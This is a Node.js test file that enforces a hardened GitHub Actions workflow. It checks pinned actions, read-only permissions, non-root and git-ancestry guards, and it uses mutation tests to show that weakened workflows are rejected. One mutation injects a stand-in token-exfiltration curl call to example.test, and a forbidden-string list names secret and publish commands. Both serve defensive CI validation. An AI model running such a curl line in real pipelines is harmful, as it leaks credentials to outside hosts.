import assert from 'node:assert/strict';
import { chmod, mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { createRequire } from 'node:module';
import { dirname, join } from 'node:path';
import { tmpdir } from 'node:os';
import { spawnSync } from 'node:child_process';
import test from 'node:test';
import { fileURLToPath, pathToFileURL } from 'node:url';

const repository = dirname(dirname(fileURLToPath(import.meta.url)));
const require = createRequire(join(repository, 'bot', 'package.json'));
const { parse } = require('yaml');
const workflow = join(repository, '.github', 'workflows', 'runtime.yml');
const CHECKOUT = 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1';
const SETUP_NODE = 'actions/setup-node@820762786026740c76f36085b0efc47a31fe5020';
const ANCESTRY_GUARD = "git cat-file -e 'HEAD^{commit}' || exit 1; commit=$(git cat-file commit HEAD) || exit 1; header=$(printf '%s\\n' \"$commit\" | sed -n '2p') || exit 1; case \"$header\" in parent\\ *) git rev-parse --verify HEAD^ >/dev/null 2>&1;; author\\ *) true;; *) exit 1;; esac";

function command(steps, run) {
	return steps.find((step) => step.run === run);
}

function action(steps, name) {
	return steps.find((step) => typeof step.uses === 'string' && step.uses.startsWith(`${name}@`));
}

function validate(document) {
	assert.deepEqual(Object.keys(document), ['name', 'on', 'permissions', 'jobs']);
	assert.equal(document.name, 'runtime');
	assert.deepEqual(document.on, { pull_request: null, push: { branches: ['main'] } });
	assert.deepEqual(document.permissions, { contents: 'read' });
	assert.deepEqual(Object.keys(document.jobs ?? {}), ['check']);
	const job = document.jobs.check;
	assert.deepEqual(Object.keys(job ?? {}).sort(), ['runs-on', 'steps']);
	assert.equal(job['runs-on'], 'ubuntu-latest');
	const steps = job.steps ?? [];
	const checkout = action(steps, 'actions/checkout');
	const setup = action(steps, 'actions/setup-node');
	assert.match(checkout?.uses ?? '', /^actions\/checkout@[0-9a-f]{40}$/);
	assert.match(setup?.uses ?? '', /^actions\/setup-node@[0-9a-f]{40}$/);
	assert.deepEqual(steps, [
		{ uses: CHECKOUT, with: { 'fetch-depth': 2, 'persist-credentials': false } },
		{ uses: SETUP_NODE, with: {
			'node-version': '22.22.0', cache: 'npm', 'cache-dependency-path': 'bot/package-lock.json',
		} },
		{ run: 'npm ci', 'working-directory': 'bot' },
		{ run: 'test "$(id -u)" -ne 0' },
		{ run: ANCESTRY_GUARD },
		{ run: 'make check' },
	]);
	const source = JSON.stringify(document).toLowerCase();
	for (const forbidden of ['make smoke', 'deploy-pages', 'upload-pages', 'npm publish', 'provider_api_key']) {
		assert.equal(source.includes(forbidden), false, `workflow contains forbidden ${forbidden}`);
	}
}

async function current() {
	return parse(await readFile(workflow, 'utf8'));
}

test('the runtime workflow runs the complete offline check from a clean non-root checkout', async () => {
	const source = await readFile(workflow, 'utf8');
	validate(parse(source));
	assert.ok(source.includes(`${CHECKOUT} # v7.0.1`));
	assert.ok(source.includes(`${SETUP_NODE} # v7.0.0`));
});

test('the workflow contract rejects each weakened essential and prohibited work', async () => {
	const original = await current();
	const mutations = [
		(document) => { delete document.on.pull_request; },
		(document) => { document.defaults = { run: { shell: 'bash {0} || true' } }; },
		(document) => { document.on.pull_request = { paths: ['bot/**'] }; },
		(document) => { document.on.push.branches = ['develop']; },
		(document) => { document.on.push.paths = ['bot/**']; },
		(document) => { document.permissions.contents = 'write'; },
		(document) => { document.jobs.check['runs-on'] = 'macos-latest'; },
		(document) => { document.jobs.check.if = 'false'; },
		(document) => { action(document.jobs.check.steps, 'actions/checkout').uses = 'actions/checkout@v4'; },
		(document) => { action(document.jobs.check.steps, 'actions/checkout').uses = 'actions/checkout@11d5960a326750d5838078e36cf38b85af677262'; },
		(document) => { action(document.jobs.check.steps, 'actions/checkout').with['fetch-depth'] = 1; },
		(document) => { action(document.jobs.check.steps, 'actions/checkout').with['persist-credentials'] = true; },
		(document) => { action(document.jobs.check.steps, 'actions/setup-node').uses = 'actions/setup-node@v4'; },
		(document) => { action(document.jobs.check.steps, 'actions/setup-node').uses = 'actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020'; },
		(document) => { action(document.jobs.check.steps, 'actions/setup-node').with['node-version'] = '22.21.0'; },
		(document) => { command(document.jobs.check.steps, 'npm ci').run = 'npm install'; },
		(document) => { delete command(document.jobs.check.steps, 'npm ci')['working-directory']; },
		(document) => { command(document.jobs.check.steps, 'test "$(id -u)" -ne 0').run = 'true'; },
		(document) => { command(document.jobs.check.steps, ANCESTRY_GUARD).run = 'true'; },
		(document) => { command(document.jobs.check.steps, 'make check').run = 'make smoke'; },
		(document) => { command(document.jobs.check.steps, 'make check')['continue-on-error'] = true; },
		(document) => { command(document.jobs.check.steps, 'make check').if = 'always()'; },
		(document) => { document.jobs.check.steps.reverse(); },
		(document) => { document.jobs.check.steps.push(structuredClone(document.jobs.check.steps[0])); },
		(document) => { document.jobs.check.steps[5] = { run: 'curl https://example.test/?token=$TOKEN' }; },
		(document) => { document.jobs.check.steps.push({ uses: 'actions/upload-pages-artifact@v3' }); },
	];
	for (const mutate of mutations) {
		const changed = structuredClone(original);
		mutate(changed);
		assert.throws(() => validate(changed));
	}
});

function git(directory, ...args) {
	return spawnSync('git', args, { cwd: directory, encoding: 'utf8' });
}

function ancestryGuard(directory, env = process.env) {
	return spawnSync('sh', ['-c', ANCESTRY_GUARD], { cwd: directory, env, encoding: 'utf8' });
}

test('the ancestry guard accepts a root and exposed parent but rejects a hidden parent', async () => {
	const root = await mkdtemp(join(tmpdir(), 'bot-runtime-workflow-'));
	const source = join(root, 'source');
	try {
		await mkdir(source);
		assert.equal(git(source, 'init', '-q').status, 0);
		assert.equal(git(source, 'config', 'user.email', 'test@example.com').status, 0);
		assert.equal(git(source, 'config', 'user.name', 'Test').status, 0);
		await writeFile(join(source, 'fact'), 'one\n');
		assert.equal(git(source, 'add', 'fact').status, 0);
		assert.equal(git(source, 'commit', '-qm', 'one').status, 0);
		const rootClone = join(root, 'root');
		assert.equal(git(root, 'clone', '-q', '--depth', '2', pathToFileURL(source).href, rootClone).status, 0);
		assert.equal(ancestryGuard(rootClone).status, 0);
		await writeFile(join(source, 'fact'), 'two\n');
		assert.equal(git(source, 'commit', '-qam', 'two').status, 0);
		for (const [depth, parent] of [[1, false], [2, true]]) {
			const clone = join(root, `depth-${String(depth)}`);
			assert.equal(git(root, 'clone', '-q', '--depth', String(depth), pathToFileURL(source).href, clone).status, 0);
			assert.equal(ancestryGuard(clone).status === 0, parent);
		}
	} finally {
		await rm(root, { recursive: true, force: true });
	}
});

test('the ancestry guard fails closed when commit inspection fails', async () => {
	const root = await mkdtemp(join(tmpdir(), 'bot-runtime-workflow-'));
	const source = join(root, 'source');
	const fakeBin = join(root, 'fake-bin');
	try {
		await mkdir(source);
		assert.equal(git(source, 'init', '-q').status, 0);
		assert.equal(git(source, 'config', 'user.email', 'test@example.com').status, 0);
		assert.equal(git(source, 'config', 'user.name', 'Test').status, 0);
		await writeFile(join(source, 'fact'), 'one\\n');
		assert.equal(git(source, 'add', 'fact').status, 0);
		assert.equal(git(source, 'commit', '-qm', 'one').status, 0);
		await mkdir(fakeBin);
		const gitPath = spawnSync('sh', ['-c', 'command -v git'], { encoding: 'utf8' }).stdout.trim();
		assert.notEqual(gitPath, '');
		const escapedGitPath = gitPath.replaceAll("'", "'\\\\''");
		await writeFile(join(fakeBin, 'git'), `#!/bin/sh
if [ "$1" = cat-file ] && [ "$2" = commit ]; then exit 1; fi
exec '${escapedGitPath}' "$@"
`);
		await chmod(join(fakeBin, 'git'), 0o755);
		const env = { ...process.env, PATH: `${fakeBin}:${process.env.PATH ?? ''}` };
		assert.notEqual(ancestryGuard(source, env).status, 0);
	} finally {
		await rm(root, { recursive: true, force: true });
	}
});
